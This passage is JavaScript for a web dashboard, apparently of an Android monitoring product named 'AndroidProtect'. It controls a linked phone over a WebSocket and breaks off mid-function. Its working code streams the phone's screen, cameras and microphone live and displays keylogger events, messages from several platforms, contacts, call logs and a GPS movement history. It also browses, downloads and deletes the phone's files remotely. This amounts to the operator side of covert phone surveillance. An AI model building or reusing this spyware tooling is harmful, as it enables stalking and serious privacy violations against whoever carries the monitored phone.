// Global variables
let socket = null;
let map = null;
let currentFsType = null; // 'screen' | 'front' | 'back'
let deviceMarker = null;
let deviceAccuracyCircle = null;
let trailPolylines = [];
let dayMarkers = [];
let currentDeviceId = null;
let devicesMap = new Map();
let planMaxDevices = 1; // from DEVICE_LIST packet
let isScreenStreaming = false;
let isCameraStreaming = false;
let activeCameraType = null; // 'front' | 'back'
let isAudioStreaming = false;
let currentStreamObjectUrl = null;
let currentCamObjectUrl = null;
let sentAudioLog = [];
let mapFollowMode = true; // Auto-center map on device GPS updates
let trailRefreshInterval = null;

// Street name history (reverse geocoding)
let recentStreets = [];       // last 10 unique street names
let lastGeocodeTime = 0;      // throttle: ms timestamp of last geocode call
let streetUpdateInterval = null; // hourly update timer

// File browser state
let fbCurrentPath = '';
let fbHistory     = [];
let fbPreviewPending = {}; // path → { name, itemEl } — tracks pending preview requests

// Web Audio API for live PCM streaming
let audioCtx = null;
let audioNextTime = 0;
const AUDIO_SAMPLE_RATE = 16000;

// ─── Leaflet tile layers (Mapbox) ───────────────────────────────────────────
let MAPBOX_TOKEN = '';
const TILES = {
    dark: {
        url: 'https://api.mapbox.com/styles/v1/mapbox/dark-v11/tiles/{z}/{x}/{y}{r}?access_token={accessToken}',
        attr: '&copy; <a href="https://www.mapbox.com/">Mapbox</a> &copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
    },
    satellite: {
        url: 'https://api.mapbox.com/styles/v1/mapbox/satellite-v9/tiles/{z}/{x}/{y}{r}?access_token={accessToken}',
        attr: '&copy; <a href="https://www.mapbox.com/">Mapbox</a> &copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
    },
    roads: {
        url: 'https://api.mapbox.com/styles/v1/mapbox/streets-v12/tiles/{z}/{x}/{y}{r}?access_token={accessToken}',
        attr: '&copy; <a href="https://www.mapbox.com/">Mapbox</a> &copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
    }
};

let currentTileLayer = null;
let currentMapStyle  = 'dark';

// ─── Auth helpers ─────────────────────────────────────────────────────────────
function getToken()    { return localStorage.getItem('ap_token') || ''; }
function getUsername() { return localStorage.getItem('ap_username') || ''; }
function getLinkToken(){ return localStorage.getItem('ap_linktoken') || ''; }

function authHeaders() {
    return { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + getToken() };
}

async function doLogout() {
    await fetch('/api/auth/logout', { method: 'POST', headers: authHeaders() }).catch(() => {});
    localStorage.removeItem('ap_token');
    localStorage.removeItem('ap_username');
    localStorage.removeItem('ap_linktoken');
    window.location.href = '/login.html';
}

function showLinkCode() {
    let popup = document.getElementById('link-code-popup');
    if (!popup) return;

    // Toggle off if already visible
    if (popup._portalOpen) {
        closeLinkCodePopup();
        return;
    }

    // Move popup to <body> as a direct child so it escapes every
    // stacking context created by backdrop-filter on the grid cards
    if (popup.parentElement !== document.body) {
        document.body.appendChild(popup);
    }

    // Position under the link button
    const btn = document.getElementById('user-link-btn');
    if (btn) {
        const r = btn.getBoundingClientRect();
        popup.style.top  = (r.bottom + 8) + 'px';
        popup.style.right = (window.innerWidth - r.right) + 'px';
        popup.style.left  = 'auto';
    }

    document.getElementById('lcp-token-val').textContent = getLinkToken() || '—';
    popup.style.display = 'block';
    popup._portalOpen = true;

    // Close on click outside
    setTimeout(() => {
        document.addEventListener('click', _lcpOutsideHandler);
    }, 60);
}

function _lcpOutsideHandler(e) {
    const popup = document.getElementById('link-code-popup');
    const btn   = document.getElementById('user-link-btn');
    if (popup && !popup.contains(e.target) && e.target !== btn && !btn?.contains(e.target)) {
        closeLinkCodePopup();
    }
}

function closeLinkCodePopup() {
    const popup = document.getElementById('link-code-popup');
    if (!popup) return;
    popup.style.display = 'none';
    popup._portalOpen   = false;
    document.removeEventListener('click', _lcpOutsideHandler);
}

function copyLinkCode() {
    const token = getLinkToken();
    if (!token) return;
    navigator.clipboard.writeText(token).then(() => {
        const btn = document.querySelector('.lcp-copy');
        if (btn) { btn.innerHTML = '<i class="fa-solid fa-check"></i> Copiado!'; setTimeout(() => { btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copiar'; }, 1500); }
    });
}

// ─── Initialize Dashboard ─────────────────────────────────────────────────────
window.addEventListener('DOMContentLoaded', async () => {
    const nameEl = document.getElementById('user-name-display');
    if (nameEl) nameEl.textContent = getUsername();
    try {
        const cfgResp = await fetch('/api/config');
        if (cfgResp.ok) {
            const cfg = await cfgResp.json();
            if (cfg.mapboxToken) MAPBOX_TOKEN = cfg.mapboxToken;
        }
    } catch (e) { console.warn('Failed to load /api/config', e); }
    initMapIfReady();   // Leaflet is synchronous — init after token is loaded
    connectWebSocket();
    initMobileTabs();
    // Auto-refresh trail history every hour (to show new points without overloading the map)
    trailRefreshInterval = setInterval(() => {
        if (currentDeviceId) fetchTrailHistory(currentDeviceId);
    }, 3600000);
    window.addEventListener('resize', () => {
        // Re-apply the active tab so visibility rules stay consistent across
        // viewport changes (mobile ↔ desktop). The CSS handles the actual
        // show/hide based on the tab-visible class + viewport media query.
        switchTab(activeTab);
    });
});

// ─── Navigation (sidebar + mobile tabs) ─────────────────────────────────────

let activeTab = 'map';

// Highlight the sidebar nav item that matches tab (and optional platform)
function updateSidebarActive(tab, platform) {
    const navKey = platform ? `msg-${platform}` : tab;
    document.querySelectorAll('.snav-item').forEach(el => {
        el.classList.toggle('active', el.dataset.nav === navKey);
    });
}

// Called by sidebar nav items
function sidebarNav(tab, platform) {
    updateSidebarActive(tab, platform);

    // Switch to single-panel view of that tab (same UX on mobile + desktop —
    // the sidebar is a navigator, not a scroll shortcut).
    switchTab(tab);
    if (platform) waSwitchPlatform(platform);

    // Close sidebar on mobile (no-op on desktop)
    closeSidebar();
}

// Toggle the devices collapsible panel
function toggleSidebarDevices() {
    const panel   = document.getElementById('sidebar-devices-panel');
    const chevron = document.getElementById('snav-devices-chevron');
    const isNowCollapsed = panel.classList.toggle('collapsed');
    chevron.classList.toggle('collapsed', isNowCollapsed);
}

// Tabs that live inside the "Mais" drawer — their activation highlights the Mais button
const MORE_TABS = new Set(['more', 'contacts', 'calllogs', 'keylog']);

function switchTab(tab) {
    activeTab = tab;

    // Close more drawer if open
    closeMoreDrawer();

    // Update bottom nav buttons (mobile only, but harmless on desktop)
    // Any tab inside MORE_TABS activates the "Mais" button
    const isMoreGroup = MORE_TABS.has(tab);
    document.querySelectorAll('.mbn-tab').forEach(btn => {
        const directMatch = btn.dataset.tab === tab;
        const moreMatch   = isMoreGroup && btn.id === 'mbn-more';
        btn.classList.toggle('active', directMatch || moreMatch);
    });

    // Show/hide cards. On mobile this is handled by CSS media query
    // (.grid-card default display:none, .tab-visible shows one card).
    // On desktop the same class triggers our :has(.tab-visible) rule
    // in style.css to collapse the grid to a single-panel view.
    document.querySelectorAll('#dashboard-grid [data-tab]').forEach(card => {
        card.classList.toggle('tab-visible', card.dataset.tab === tab);
    });

    // When switching to map tab, trigger resize so Leaflet re-renders
    if (tab === 'map' && map) {
        setTimeout(() => {
            map.invalidateSize();
            if (deviceMarker) map.panTo(deviceMarker.getLatLng());
        }, 120);
    }

    // When leaving messages, reset to conversation list view
    if (tab !== 'sms') {
        document.querySelector('.wa-body')?.classList.remove('wa-in-chat');
    }

    // Update sidebar active state to match tab
    updateSidebarActive(tab);

    // Close sidebar if open
    closeSidebar();
}

// ── More drawer ──────────────────────────────────────────────────────────────
function openMoreDrawer() {
    if (window.innerWidth > 767) { switchTab('more'); return; }
    const drawer  = document.getElementById('more-drawer');
    const overlay = document.getElementById('more-drawer-overlay');
    if (!drawer) return;
    // Highlight active item inside drawer
    drawer.querySelectorAll('.mdr-item').forEach(btn => {
        btn.classList.toggle('mdr-active', btn.getAttribute('onclick')?.includes(`'${activeTab}'`));
    });
    overlay.classList.add('active');
    // Two-frame trick so transform transition fires after display change
    requestAnimationFrame(() => requestAnimationFrame(() => drawer.classList.add('open')));
}

function closeMoreDrawer() {
    document.getElementById('more-drawer')?.classList.remove('open');
    document.getElementById('more-drawer-overlay')?.classList.remove('active');
}

function mdrSelect(tab) {
    closeMoreDrawer();
    switchTab(tab);
}

// Initialize tabs on mobile after DOM ready
function initMobileTabs() {
    if (window.innerWidth <= 767) {
        switchTab('map');
    } else {
        // Desktop: show all cards
        document.querySelectorAll('#dashboard-grid [data-tab]').forEach(c => c.style.display = '');
        // Highlight "Mapa" as default in sidebar
        updateSidebarActive('map');
    }
}

// ─── Trail History Panel ─────────────────────────────────────────────────────

let trailHistoryPoints = []; // cached points from last fetch
let trailPanelOpen = false;

function toggleTrailPanel() {
    trailPanelOpen ? closeTrailPanel() : openTrailPanel();
}

function openTrailPanel() {
    trailPanelOpen = true;
    document.getElementById('trail-panel').classList.add('open');
    renderTrailPanel();
}

function closeTrailPanel() {
    trailPanelOpen = false;
    document.getElementById('trail-panel').classList.remove('open');
}

function renderTrailPanel() {
    const list    = document.getElementById('trail-panel-list');
    const summary = document.getElementById('trail-panel-summary');

    if (trailHistoryPoints.length === 0) {
        list.innerHTML = '<div class="trail-panel-empty"><i class="fa-solid fa-route fa-2x"></i><p>Nenhum ponto ainda.</p></div>';
        summary.innerHTML = '';
        return;
    }

    // Calculate stats
    const totalKm = calcTotalDistance(trailHistoryPoints);
    const oldest  = trailHistoryPoints[0];
    const newest  = trailHistoryPoints[trailHistoryPoints.length - 1];
    const elapsed = newest.timestamp - oldest.timestamp;
    const hours   = Math.floor(elapsed / 3600000);
    const mins    = Math.floor((elapsed % 3600000) / 60000);
    const avgAcc  = Math.round(trailHistoryPoints.reduce((s,p) => s + p.accuracy, 0) / trailHistoryPoints.length);

    summary.innerHTML = `
        <div class="trail-sum-item">
            <span class="trail-sum-val">${totalKm.toFixed(2)}</span>
            <span class="trail-sum-label">km percorridos</span>
        </div>
        <div class="trail-sum-item">
            <span class="trail-sum-val">${trailHistoryPoints.length}</span>
            <span class="trail-sum-label">pontos GPS</span>
        </div>
        <div class="trail-sum-item">
            <span class="trail-sum-val">${hours > 0 ? hours+'h ' : ''}${mins}min</span>
            <span class="trail-sum-label">duração</span>
        </div>
        <div class="trail-sum-item">
            <span class="trail-sum-val">±${avgAcc}m</span>
            <span class="trail-sum-label">precisão média</span>
        </div>
    `;

    // Render list (newest first)
    const totalDays = new Set(trailHistoryPoints.map(p => {
        const d = new Date(p.timestamp); return `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
    })).size;

    list.innerHTML = '';
    const points = [...trailHistoryPoints].reverse();
    let lastDay  = null;

    points.forEach((p, idx) => {
        const d        = new Date(p.timestamp);
        const dayKey   = `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
        const ratio    = 1 - (idx / Math.max(points.length - 1, 1)); // newest=1, oldest=0
        const dotColor = interpolateTrailColor(ratio);

        // Day divider
        if (dayKey !== lastDay) {
            lastDay = dayKey;
            const divider = document.createElement('div');
            divider.style.cssText = 'padding:8px 16px 4px;font-size:.7rem;font-weight:700;color:var(--text-secondary);text-transform:uppercase;letter-spacing:.8px;background:rgba(0,0,0,.3);';
            divider.innerHTML = `<i class="fa-solid fa-calendar-day" style="color:var(--neon-blue);margin-right:6px;"></i>${d.toLocaleDateString('pt-BR', {weekday:'long', day:'2-digit', month:'long'})}`;
            list.appendChild(divider);
        }

        const timeStr  = d.toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
        const accColor = p.accuracy <= 10 ? 'var(--neon-green)' : p.accuracy <= 30 ? 'var(--neon-orange)' : 'var(--danger-red)';
        const accLabel = p.accuracy <= 10 ? 'Alta precisão (GPS)' : p.accuracy <= 50 ? 'Média precisão' : 'Baixa precisão';

        const item = document.createElement('div');
        item.className = 'trail-point-item';
        item.innerHTML = `
            <div class="trail-point-dot" style="background:${dotColor};box-shadow:0 0 5px ${dotColor}40;"></div>
            <div class="trail-point-info">
                <div class="trail-point-time">${timeStr}</div>
                <div class="trail-point-coords">${p.lat.toFixed(6)}, ${p.lng.toFixed(6)}</div>
                <div class="trail-point-acc">
                    <span style="color:${accColor}">●</span>
                    <span style="color:${accColor}">${accLabel}</span>
                    <span style="margin-left:4px;">±${p.accuracy.toFixed(0)}m</span>
                </div>
            </div>
            <button class="trail-center-btn" onclick="panMapToPoint(${p.lat},${p.lng})" title="Ver no mapa">
                <i class="fa-solid fa-crosshairs"></i>
            </button>
        `;
        list.appendChild(item);
    });

    // Update stats in bar
    document.getElementById('trail-km').textContent = totalKm.toFixed(1);
    document.getElementById('trail-pts').textContent = trailHistoryPoints.length;
}

function panMapToPoint(lat, lng) {
    if (!map) return;
    map.setView([lat, lng], 16);
    closeTrailPanel();
    if (window.innerWidth <= 767) switchTab('map');
}

function calcTotalDistance(points) {
    let total = 0;
    for (let i = 1; i < points.length; i++) {
        total += haversineKm(points[i-1].lat, points[i-1].lng, points[i].lat, points[i].lng);
    }
    return total;
}

function haversineKm(lat1, lng1, lat2, lng2) {
    const R = 6371;
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLng = (lng2 - lng1) * Math.PI / 180;
    const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180) * Math.cos(lat2*Math.PI/180) * Math.sin(dLng/2)**2;
    return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
}

// ─── Street History (Nominatim reverse geocoding) ────────────────────────────

async function reverseGeocode(lat, lng) {
    try {
        const res = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`,
            { headers: { 'Accept-Language': 'pt-BR,pt', 'User-Agent': 'AndroidProtect/1.0' } }
        );
        const data = await res.json();
        const addr = data.address || {};
        return addr.road || addr.pedestrian || addr.path || addr.neighbourhood || addr.suburb
            || (data.display_name || '').split(',')[0] || null;
    } catch { return null; }
}

async function updateStreetHistory(lat, lng) {
    const now = Date.now();
    if (now - lastGeocodeTime < 90_000) return; // at most once per 90 s
    lastGeocodeTime = now;
    const street = await reverseGeocode(lat, lng);
    if (!street) return;
    if (recentStreets.length > 0 && recentStreets[0] === street) return;
    recentStreets.unshift(street);
    if (recentStreets.length > 10) recentStreets.pop();
    renderStreetHistory();
}

function renderStreetHistory() {
    const el = document.getElementById('street-history-list');
    if (!el) return;
    if (recentStreets.length === 0) {
        el.innerHTML = '<div class="street-empty"><i class="fa-solid fa-map-pin"></i> Nenhuma rua registrada ainda.</div>';
        return;
    }
    el.innerHTML = recentStreets.map((s, i) =>
        `<div class="street-item"><span class="street-idx">${i + 1}</span><i class="fa-solid fa-road"></i><span class="street-name">${escapeHtml(s)}</span></div>`
    ).join('');
}

function startStreetUpdateScheduler() {
    if (streetUpdateInterval) clearInterval(streetUpdateInterval);
    streetUpdateInterval = setInterval(() => {
        if (!currentDeviceId || realtimeLocationActive) return;
        if (trailHistoryPoints.length === 0) return;
        const last = trailHistoryPoints[trailHistoryPoints.length - 1];
        lastGeocodeTime = 0; // force update
        updateStreetHistory(last.lat, last.lng);
    }, 3_600_000); // every 1 hour
}

// ─── GPS Bar Update ───────────────────────────────────────────────────────────

let lastGpsTimestamp = 0;

function updateGpsBar(lat, lng, accuracy, timestamp) {
    const bar  = document.getElementById('map-gps-bar');
    const dot  = document.getElementById('gps-dot');
    const txt  = document.getElementById('gps-bar-text');
    if (!bar) return;

    lastGpsTimestamp = timestamp || Date.now();
    const time = new Date(lastGpsTimestamp).toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
    const accColor  = accuracy <= 10 ? 'var(--neon-green)' : accuracy <= 30 ? 'var(--neon-orange)' : 'var(--danger-red)';
    const accLabel  = accuracy <= 10 ? 'GPS Alta' : accuracy <= 30 ? 'GPS Média' : 'Rede/WiFi';

    dot.className = 'gps-dot active';
    txt.innerHTML = `<span style="color:${accColor};font-weight:700;">${accLabel}</span> ±${accuracy.toFixed(0)}m &nbsp;·&nbsp; ${time}`;

    // Stale check: mark orange after 60s without update
    clearTimeout(updateGpsBar._timer);
    updateGpsBar._timer = setTimeout(() => { if (dot) dot.className = 'gps-dot stale'; }, 60000);
}

// ─── Mobile Sidebar Drawer ────────────────────────────────────────────────────
function toggleSidebar() {
    const sidebar = document.getElementById('sidebar');
    const overlay = document.getElementById('sidebar-overlay');
    const isOpen  = sidebar.classList.contains('open');
    isOpen ? closeSidebar() : openSidebar();
}

function openSidebar() {
    document.getElementById('sidebar').classList.add('open');
    document.getElementById('sidebar-overlay').classList.add('visible');
    document.body.style.overflow = 'hidden'; // prevent background scroll
}

function closeSidebar() {
    document.getElementById('sidebar').classList.remove('open');
    document.getElementById('sidebar-overlay').classList.remove('visible');
    document.body.style.overflow = '';
}

// ─── Leaflet Map Init ─────────────────────────────────────────────────────────

function initMap() {
    if (map) return; // already initialized

    map = L.map('map', {
        center: [-23.55052, -46.633308],
        zoom: 13,
        zoomControl: true,
        attributionControl: true
    });

    // Load dark tile layer by default
    currentTileLayer = L.tileLayer(TILES.dark.url, {
        attribution: TILES.dark.attr,
        maxZoom: 22,
        accessToken: MAPBOX_TOKEN
    }).addTo(map);

    // Disable follow mode on manual pan
    map.on('dragstart', () => {
        mapFollowMode = false;
        const btn = document.getElementById('btn-follow');
        if (btn) btn.classList.remove('active');
    });

    console.log('Leaflet map initialized (Mapbox).');
}

// Called on DOMContentLoaded (Leaflet is synchronous, no callback needed)
function initMapIfReady() {
    if (typeof L !== 'undefined' && document.getElementById('map')) {
        initMap();
    }
}

// Toggle map follow mode
function toggleFollowMode() {
    mapFollowMode = !mapFollowMode;
    const btn = document.getElementById('btn-follow');
    if (btn) btn.classList.toggle('active', mapFollowMode);
    logToConsole(mapFollowMode ? '📍 Modo seguimento ativado.' : '📍 Modo seguimento desativado.', 'system');
}

// Toggle real-time location tracking on the device
let realtimeLocationActive = false;
function toggleRealtimeLocation() {
    if (!currentDeviceId) return;
    realtimeLocationActive = !realtimeLocationActive;
    const btn = document.getElementById('btn-realtime-loc');
    const btnMobile = document.getElementById('btn-realtime-loc-mobile');
    if (realtimeLocationActive) {
        sendCommand('START_LOCATION', {});
        if (btn) { btn.classList.add('active'); btn.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> Desativar'; }
        if (btnMobile) { btnMobile.classList.add('active'); btnMobile.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> Desativar'; }
        logToConsole('📍 Rastreamento em tempo real ativado.', 'system');
    } else {
        sendCommand('STOP_LOCATION', {});
        if (btn) { btn.classList.remove('active'); btn.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> Ativar'; }
        if (btnMobile) { btnMobile.classList.remove('active'); btnMobile.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> Ativar'; }
        logToConsole('📍 Rastreamento em tempo real desativado.', 'system');
    }
}

// Center map on device
function centerOnDevice() {
    if (deviceMarker && map) {
        map.setView(deviceMarker.getLatLng(), 17);
    } else if (currentDeviceId && trailHistoryPoints.length > 0) {
        const last = trailHistoryPoints[trailHistoryPoints.length - 1];
        map.setView([last.lat, last.lng], 16);
    }
}

// Switch tile layer
function setMapType(type) {
    if (!map) return;
    document.querySelectorAll('.btn-map-type').forEach(b => b.classList.remove('active'));

    let tileKey = 'dark', btnId = 'btn-map-dark', label = 'Cyber-Dark';
    if (type === 'hybrid')       { tileKey = 'satellite'; btnId = 'btn-map-satellite'; label = 'Satélite'; }
    if (type === 'roadmap_cyber'){ tileKey = 'roads';     btnId = 'btn-map-hybrid';    label = 'Ruas OSM'; }

    document.getElementById(btnId)?.classList.add('active');
    if (currentTileLayer) map.removeLayer(currentTileLayer);
    currentTileLayer = L.tileLayer(TILES[tileKey].url, {
        attribution: TILES[tileKey].attr,
        maxZoom: 22,
        accessToken: MAPBOX_TOKEN
    }).addTo(map);
    currentMapStyle = tileKey;
    logToConsole(`Mapa: ${label}`, 'system');
}

// Connect to Ktor WebSocket
let wsReconnectDelay = 1000;
const WS_RECONNECT_MAX_DELAY = 30000;

function connectWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws/dashboard?token=${encodeURIComponent(getToken())}`;

    logToConsole('Conectando ao servidor...', 'system');

    socket = new WebSocket(wsUrl);
    socket.binaryType = 'arraybuffer'; // Crucial for receiving binary screen frames

    socket.onopen = () => {
        wsReconnectDelay = 1000; // reset backoff on a successful connection
        logToConsole('Conectado ao servidor de controle.', 'success');
    };

    socket.onclose = () => {
        const delaySec = (wsReconnectDelay / 1000).toFixed(0);
        logToConsole(`Conexão perdida. Reconectando em ${delaySec} segundos...`, 'error');
        // Mark all devices as offline — don't clear the list, keep them visible
        devicesMap.forEach(dev => { dev.isOnline = false; });
        renderDeviceList();
        if (currentDeviceId) {
            const dev = devicesMap.get(currentDeviceId);
            if (dev) updateActiveDeviceUI(dev);
        }
        setTimeout(connectWebSocket, wsReconnectDelay);
        wsReconnectDelay = Math.min(wsReconnectDelay * 2, WS_RECONNECT_MAX_DELAY);
    };
    
    socket.onerror = (error) => {
        console.error('WebSocket Error: ', error);
    };
    
    socket.onmessage = (event) => {
        if (event.data instanceof ArrayBuffer) {
            handleBinaryFrame(event.data);
        } else {
            // Text frame (JSON event)
            try {
                const data = JSON.parse(event.data);
                handleJsonMessage(data);
            } catch (err) {
                console.warn('Failed to parse text message:', event.data, err);
            }
        }
    };
}

// Handle JSON events
function handleJsonMessage(data) {
    switch (data.type) {
        case 'DEVICE_LIST':
            if (data.maxDevices != null) planMaxDevices = data.maxDevices;
            updateDeviceList(data.devices);
            checkTrialWarnings();
            break;
            
        case 'DEVICE_CONNECTED':
            logToConsole(`Dispositivo conectado: ${data.device.model} (${data.device.deviceId})`, 'success');
            devicesMap.set(data.device.deviceId, data.device);
            renderDeviceList();
            if (!currentDeviceId) {
                selectDevice(data.device.deviceId);
            }
            break;
            
        case 'DEVICE_DISCONNECTED':
            logToConsole(`Dispositivo desconectado: ${data.deviceId}`, 'error');
            const dev = devicesMap.get(data.deviceId);
            if (dev) {
                dev.isOnline = false;
                devicesMap.set(data.deviceId, dev);
                renderDeviceList();
                if (currentDeviceId === data.deviceId) {
                    updateActiveDeviceUI(dev);
                }
            }
            break;
            
        case 'TELEMETRY':
            handleTelemetry(data);
            break;
            
        case 'PHOTO_UPLOADED':
            logToConsole(`Nova foto recebida do dispositivo!`, 'success');
            if (data.deviceId === currentDeviceId) {
                fetchMediaList(currentDeviceId);
            }
            break;
            
        case 'AUDIO_UPLOADED':
            logToConsole(`Nova gravação de áudio recebida do dispositivo!`, 'success');
            if (data.deviceId === currentDeviceId) {
                fetchMediaList(currentDeviceId);
            }
            break;

        case 'NEW_MESSAGE':
            if (data.deviceId === currentDeviceId) {
                const wasAlreadySeen = data.id != null && waSeenIds.has(data.id);
                const addrKey = waAddrKey(data);
                const isOpen = currentWaAddress === addrKey;
                waAddMessage(data);
                waRenderSidebar();
                if (!isOpen && !wasAlreadySeen) {
                    const conv = conversationsMap.get(addrKey);
                    if (conv) { conv.unread = (conv.unread || 0) + 1; waRenderSidebar(); }
                }
            }
            const srcLabel = waPlatformLabel(data.source);
            const srcEmoji = waPlatformEmoji(data.source);
            if (data.direction === 'in') {
                logToConsole(`${srcEmoji} ${srcLabel} recebido de ${data.address || 'desconhecido'}: ${data.content}`, 'success');
            } else if (data.direction === 'out') {
                logToConsole(`📤 ${srcLabel} enviado para ${data.address || 'desconhecido'}: ${data.content}`, 'info');
            }
            break;

        case 'CONTACTS':
            if (data.deviceId === currentDeviceId) contactsRender(data.contacts || []);
            break;

        case 'CALL_LOG':
            if (data.deviceId === currentDeviceId) calllogsRender(data.calls || []);
            break;

        case 'KEYLOG_EVENT':
            if (data.deviceId === currentDeviceId) keylogAppend(data);
            break;

        case 'FILE_LIST':
            if (data.deviceId === currentDeviceId) fbRenderList(data);
            break;
        case 'FILE_LIST_ERROR':
            if (data.deviceId === currentDeviceId) fbShowError(data.error);
            break;
        case 'FILE_DELETED':
            if (data.deviceId === currentDeviceId) {
                logToConsole(`${data.success ? '✅' : '❌'} Exclusão remota: ${data.path}`, data.success ? 'success' : 'error');
                if (data.success) fbRefresh();
            }
            break;
        case 'FILE_READY':
            if (data.deviceId === currentDeviceId) {
                logToConsole(`📥 Arquivo recebido: ${data.name}`, 'success');
                fbHandleFileReady(data.name, data.url, data.originalPath);
            }
            break;

        case 'ERROR':
            logToConsole(`Erro: ${data.message}`, 'error');
            break;
            
        default:
            console.log('Unhandled JSON event:', data);
    }
}

// Route binary frames by first byte (type byte)
// 0x01 = screen JPEG | 0x02 = front cam JPEG | 0x03 = back cam JPEG | 0x04 = audio PCM
// legacy (no prefix, raw JPEG) = screen
function handleBinaryFrame(arrayBuffer) {
    const view = new Uint8Array(arrayBuffer);
    const type = view[0];

    // Legacy raw JPEG (no prefix): first byte of JPEG is 0xFF = 255
    if (type === 255 || type > 10) {
        handleScreenFrame(arrayBuffer);
        return;
    }

    const payload = arrayBuffer.slice(1);
    switch (type) {
        case 1: handleScreenFrame(payload); break;
        case 2: handleCameraFrame(payload, 'front'); break;
        case 3: handleCameraFrame(payload, 'back');  break;
        case 4: handleAudioPcmChunk(payload);        break;
        default: handleScreenFrame(arrayBuffer);
    }
}

// Handle Screen JPEG frames
function handleScreenFrame(arrayBuffer) {
    if (!isScreenStreaming || !currentDeviceId) return;

    const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);

    const img = document.getElementById('screen-stream-img');
    const ph  = document.getElementById('screen-placeholder');
    if (img) { img.src = url; img.style.display = 'block'; }
    if (ph)  ph.style.display = 'none';

    // Mirror to fullscreen if active
    if (currentFsType === 'screen') updateFsFrame(url);

    if (currentStreamObjectUrl) URL.revokeObjectURL(currentStreamObjectUrl);
    currentStreamObjectUrl = url;
}

// Handle live camera JPEG frames
function handleCameraFrame(arrayBuffer, camType) {
    if (!isCameraStreaming || activeCameraType !== camType) return;

    const blob = new Blob([arrayBuffer], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);

    if (camType === 'front') {
        const img = document.getElementById('cam-stream-img');
        const ph  = document.getElementById('cam-front-placeholder');
        if (img) { img.src = url; img.style.display = 'block'; }
        if (ph)  ph.style.display = 'none';
    } else {
        const img = document.getElementById('cam-back-stream-img');
        const ph  = document.getElementById('cam-back-placeholder');
        if (img) { img.src = url; img.style.display = 'block'; }
        if (ph)  ph.style.display = 'none';
    }

    // Mirror to fullscreen if active
    if (currentFsType === camType) updateFsFrame(url);

    if (currentCamObjectUrl) URL.revokeObjectURL(currentCamObjectUrl);
    currentCamObjectUrl = url;
}

// Handle live PCM audio chunks (Int16, 16kHz, mono)
function handleAudioPcmChunk(arrayBuffer) {
    if (!isAudioStreaming) return;
    if (!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: AUDIO_SAMPLE_RATE });
        audioNextTime = audioCtx.currentTime + 0.1;
    }
    if (audioCtx.state === 'suspended') audioCtx.resume();

    const int16 = new Int16Array(arrayBuffer);
    const float32 = new Float32Array(int16.length);
    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;

    const buffer = audioCtx.createBuffer(1, float32.length, AUDIO_SAMPLE_RATE);
    buffer.copyToChannel(float32, 0);

    const src = audioCtx.createBufferSource();
    src.buffer = buffer;
    src.connect(audioCtx.destination);

    const now = audioCtx.currentTime;
    const start = Math.max(audioNextTime, now);
    src.start(start);
    audioNextTime = start + buffer.duration;
}

// Toggle camera stream on/off
function toggleCameraStream(cam) {
    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }

    if (isCameraStreaming && activeCameraType === cam) {
        sendCommand('STOP_CAMERA_STREAM');
        stopLocalCameraUI();
    } else {
        if (isCameraStreaming) sendCommand('STOP_CAMERA_STREAM');
        sendCommand('START_CAMERA_STREAM', { camera: cam });
        isCameraStreaming = true;
        activeCameraType  = cam;

        // Show live badge on the correct panel
        const frontBadge = document.getElementById('cam-front-badge');
        const backBadge  = document.getElementById('cam-back-badge');
        if (frontBadge) frontBadge.style.display = cam === 'front' ? 'inline-flex' : 'none';
        if (backBadge)  backBadge.style.display  = cam === 'back'  ? 'inline-flex' : 'none';

        // Update control button icon
        const icon = document.getElementById(cam === 'front' ? 'sc-front-icon' : 'sc-back-icon');
        if (icon) icon.className = 'fa-solid fa-stop';
    }
}

function stopLocalCameraUI() {
    isCameraStreaming = false;
    activeCameraType  = null;

    // Hide both stream images and show placeholders
    ['cam-stream-img', 'cam-back-stream-img'].forEach(id => {
        const el = document.getElementById(id);
        if (el) { el.src = ''; el.style.display = 'none'; }
    });
    ['cam-front-placeholder', 'cam-back-placeholder'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'flex';
    });

    // Hide live badges
    ['cam-front-badge', 'cam-back-badge'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });

    // Reset control icons
    ['sc-front-icon', 'sc-back-icon'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.className = 'fa-solid fa-play';
    });

    if (currentCamObjectUrl) { URL.revokeObjectURL(currentCamObjectUrl); currentCamObjectUrl = null; }
}

// Toggle live audio stream on/off
function toggleAudioStream() {
    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }

    if (isAudioStreaming) {
        sendCommand('STOP_AUDIO_STREAM');
        isAudioStreaming = false;
        if (audioCtx) { audioCtx.close(); audioCtx = null; }
        const icon = document.getElementById('btn-audio-live-icon');
        const txt  = document.getElementById('btn-audio-live-txt');
        if (icon) icon.className = 'fa-solid fa-headphones';
        if (txt)  txt.textContent = 'Ouvir Ao Vivo';
        const badge = document.getElementById('cam-audio-badge');
        if (badge) badge.style.display = 'none';
    } else {
